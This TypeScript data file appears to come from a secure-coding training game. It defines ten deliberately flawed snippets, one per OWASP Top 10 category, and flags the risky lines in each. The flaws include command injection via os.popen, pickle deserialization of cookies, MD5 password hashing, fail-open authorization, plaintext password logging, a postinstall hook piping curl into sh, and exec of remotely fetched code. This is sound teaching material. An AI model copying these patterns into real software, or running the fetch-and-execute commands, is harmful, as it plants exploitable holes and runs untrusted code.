// World: one hands-on challenge per OWASP Top 10 (2025) category.
import type { Mission, WorldNode } from "./world";

export const owasp10World: WorldNode = {
  id: "owasp10",
  kind: "place",
  children: [
    {
      id: "o-a01",
      kind: "file",
      path: "routes/admin.js",
      topics: ["owasp/broken-access-control"],
      code: {
        lang: "js",
        text: `app.post("/admin/users/:id/promote", requireLogin, async (req, res) => {
  await db.users.update(req.params.id, { role: "admin" });
  res.sendStatus(204);
});`,
      },
      risky: [1],
    },
    {
      id: "o-a02",
      kind: "file",
      path: "config/production.yaml",
      topics: ["owasp/security-misconfiguration"],
      code: {
        lang: "yaml",
        text: `app:
  debug: true
  cors_origin: "*"
  admin_password: admin
  session_timeout: 30m
  tls: required`,
      },
      risky: [2, 3, 4],
    },
    {
      id: "o-a03",
      kind: "file",
      path: "package.json",
      topics: ["owasp/supply-chain-failures"],
      code: {
        lang: "json",
        text: `{
  "dependencies": {
    "express": "^4.19.2",
    "acme-internal-auth": "*"
  },
  "scripts": {
    "postinstall": "curl -s https://get.example.dev/setup.sh | sh"
  }
}`,
      },
      risky: [4, 7],
    },
    {
      id: "o-a04",
      kind: "file",
      path: "auth/crypto.py",
      topics: ["owasp/cryptographic-failures"],
      code: {
        lang: "python",
        text: `import hashlib, random

def hash_password(pw):
    return hashlib.md5(pw.encode()).hexdigest()

def reset_token():
    return str(random.randint(100000, 999999))

API = "http://api.example.com/login"`,
      },
      risky: [4, 7, 9],
    },
    {
      id: "o-a05",
      kind: "file",
      path: "tools/ping.py",
      topics: ["owasp/injection"],
      code: {
        lang: "python",
        text: `@app.get("/ping")
def ping():
    host = request.args["host"]
    out = os.popen("ping -c 1 " + host).read()
    return out`,
      },
      risky: [4],
    },
    {
      id: "o-a06",
      kind: "file",
      path: "auth/reset.py",
      topics: ["owasp/insecure-design", "appsec/threat-modeling"],
      code: {
        lang: "python",
        text: `def reset_password(email, code, new_password):
    # the code is 4 digits, sent by SMS
    if codes[email] == code:
        users[email].password = new_password
        return True
    return False`,
      },
      risky: [2, 3],
    },
    {
      id: "o-a07",
      kind: "file",
      path: "routes/login.js",
      topics: ["owasp/authentication-failures"],
      code: {
        lang: "js",
        text: `app.post("/login", async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (!user) return res.status(404).send("No such user");
  if (user.password !== req.body.password) return res.status(401).send("Wrong password");
  req.session.userId = user.id;
  res.send("ok");
});`,
      },
      risky: [3, 4, 5],
    },
    {
      id: "o-a08",
      kind: "file",
      path: "app/session.py",
      topics: ["owasp/integrity-failures"],
      code: {
        lang: "python",
        text: `import pickle, base64

def load_session(cookie):
    return pickle.loads(base64.b64decode(cookie))

def update(url):
    code = requests.get(url).text
    exec(code)`,
      },
      risky: [4, 8],
    },
    {
      id: "o-a09",
      kind: "file",
      path: "auth/login.py",
      topics: ["owasp/logging-alerting-failures"],
      code: {
        lang: "python",
        text: `def login(user, password):
    if not check(user, password):
        return "denied"
    logger.info("login ok for %s with password %s", user, password)
    return "ok"`,
      },
      risky: [3, 4],
    },
    {
      id: "o-a10",
      kind: "file",
      path: "auth/policy.py",
      topics: ["owasp/exceptional-conditions"],
      code: {
        lang: "python",
        text: `def is_allowed(user, action):
    try:
        return policy.check(user, action)
    except Exception:
        return True`,
      },
      risky: [4, 5],
    },
  ],
};

export const owasp10Missions: Mission[] = [
  { id: "owasp10-walk", steps: ["o-a01", "o-a02", "o-a03", "o-a04", "o-a05", "o-a06", "o-a07", "o-a08", "o-a09", "o-a10"] },
  { id: "owasp10-login", steps: ["o-a07", "o-a04", "o-a09", "o-a10"] },
];
